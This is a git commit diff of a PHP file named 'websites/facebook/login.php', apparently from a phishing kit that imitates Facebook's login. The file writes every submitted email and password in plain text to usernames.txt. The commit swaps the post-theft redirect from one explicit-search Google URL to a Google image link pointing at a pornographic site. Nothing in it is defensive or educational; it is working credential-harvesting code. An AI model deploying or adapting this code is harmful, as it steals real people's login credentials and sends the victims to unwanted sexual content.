55ece9b800451944c9b1aee496bdd401951b663c
Raja <67794098+hackers1992@users.noreply.github.com>
2020-08-11 17:25:39 +0500

    Update login.php

--- websites/facebook/login.php
+++ websites/facebook/login.php
@@ -1,5 +1,5 @@
 <?php
 
 file_put_contents("usernames.txt", "Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://www.google.com/search?q=cum+on+nipple&sxsrf=ALeKk02tn0Gf0oGFltyqC0Ifu9XyrorYbA:1597141954057&source=lnms&tbm=isch&sa=X&ved=2ahUKEwiP6c62-ZLrAhVV3IUKHb_GCCMQ_AUoAnoECAsQBA&biw=1360&bih=619#imgrc=sw8EHHeis-tyWM/');
+header('Location: https://www.google.com.pk/imgres?imgurl=http%3A%2F%2Fcdn.so.fantasti.cc%2Fbig%2Fn%2Fo%2Fr%2Fnorthernguy%2Fnorthernguy_03858b.jpg&imgrefurl=https%3A%2F%2Fwww.veu.xxx%2Fxxx%2Fcum-between-my-tits-xxx.html&tbnid=Xq-CYhbuHbHWkM&vet=10CDkQMyh-ahcKEwjA1uKfj5PrAhUAAAAAHQAAAAAQFQ..i&docid=qSjEtKVo24oSfM&w=640&h=470&q=cum%20between%20boobs&hl=en&ved=0CDkQMyh-ahcKEwjA1uKfj5PrAhUAAAAAHQAAAAAQFQ/');
 exit();
